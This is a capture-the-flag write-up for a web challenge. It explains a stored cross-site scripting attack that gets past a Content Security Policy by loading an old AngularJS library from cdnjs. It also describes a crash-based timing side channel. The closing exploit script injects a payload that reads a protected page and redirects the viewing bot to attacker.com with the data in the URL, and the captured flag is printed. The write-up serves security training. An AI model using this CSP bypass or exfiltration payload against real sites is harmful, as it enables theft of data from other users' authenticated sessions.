# The Galactic Times

## Challenge

The webpage is a news article where we can leave feedback which will be viewed by an authorised user.

Regular users cannot access the `/list` or `/alien` paths.

The flag is located in the `/alien` path.

### Content Security Policy

```js
directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-eval'", "https://cdnjs.cloudflare.com/"],
    styleSrc: ["'self'", "'unsafe-inline'", "https://unpkg.com/nes.css/", "https://fonts.googleapis.com/"],
    fontSrc: ["'self'", "https://fonts.gstatic.com/"],
    imgSrc: ["'self'", "data:"],
    childSrc: ["'none'"],
    objectSrc: ["'none'"]
}
```

## Solution

Thanks to [Ming](https://ubcctf.github.io/authors/ming/) for the `script-src` CSP bypass.

Since cloudflare is included in the `script-src`, we can use an older version of angular hosted by cloudflare to execute a script that we include inside an injected HTML element.

### Less cool exfiltration

Thanks to [Robert](https://ubcctf.github.io/authors/Nneonneo/) for the DNS exfiltration and for suggesting the use of `window.location`.

Initially, we tried DNS exfiltration by inserting a `link` element with `rel=dns-prefetch` and a `href` pointing to a domain we controlled.
This worked when testing with chromium, but not using puppeteer, which is what the challenge used.

Robert realised we could ignore the CSP policies if we just redirected the user entirely using `window.location` and pointing it at a url we controlled, specifying the flag as the path.

### Cool exfiltration

The bot determines when it should close using `waitUntil: 'networkidle2'`:

```js
await page.goto('http://127.0.0.1:1337/list', {
    waitUntil: 'networkidle2'
});
```

So if we make an unlimited number of requests, the browser will never close.
However, it is set to timeout after 30000 miliseconds and throw an exception.

As the bot is run by the same master node process as the server, both the bot and server will crash.

The supervisor will restart the process after a couple seconds, but the downtime can be detected by sending some requests 30 seconds after the initial request, spaced 0.5 seconds apart.

We can convert the flag to a binary string and pass it as our while condition to determine if a bit is 0 or 1:

```js
while(output.charCodeAt(0).toString(2)[0] === "1") {
    await fetch("http://127.0.0.1:1337/alien");
}
```

Placing this in our payload, the browser will be caught in an infinite loop if and only if the first bit of the flag is 1.

In our exploit script, we can sleep for about 30 seconds, then start sending requests to check for downtime, which would indicate a timeout:

```py
time.sleep(29.5)
for i in range(10):
    time.sleep(0.5)
    val = requests.post(base_url, data={"a":"b"}, verify=False)
    print(val)
```

This process can be repeated for each bit in the flag.
However, each bit takes over 30 seconds to read, so it is advisable to reduce the search space by omitting the known characters of the flag and the leading bit of each character.

## Exploit

```py
#!/usr/bin/env python3

import requests
import json
import time

real_url = "localhost:1337"
base_url = 'http://' + real_url + '/api/submit'

def send_payload(url, payload):
    response = requests.post(url, data=payload, verify=False)
    return response.content

def create_payload():
    payload = """<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js> </script><K Ng-App>{{$new.constructor('
        const dostuff = async () => {
            const res = await fetch("http://127.0.0.1:1337/alien");
            const text = await res.text();
            const obj = document.createElement("div");
            obj.innerHTML = text;
            output = obj.getElementsByClassName("edition")[0].innerHTML.replaceAll(/./g,(m)=>m.charCodeAt(0).toString(16));
            window.location = "https://attacker.com/" + output;
        };
        dostuff();
        ')()}}"""
    return {"feedback": payload}

# Payload for cool solution
"""
while(output.charCodeAt(0).toString(2)[0] === "1") {
    await fetch("http://127.0.0.1:1337/alien");
}
"""

def do_real():
    val = send_payload(base_url, create_payload())
    print(val)

# Detect downtime for cool solution:
"""
time.sleep(29.5)
for i in range(10):
    time.sleep(0.5)
    val = requests.post(base_url, data={"a":"b"}, verify=False)
    print(val)
"""

do_real()
```

## Flag

`CHTB{th3_wh1t3l1st3d_CND_str1k3s_b4ck}`

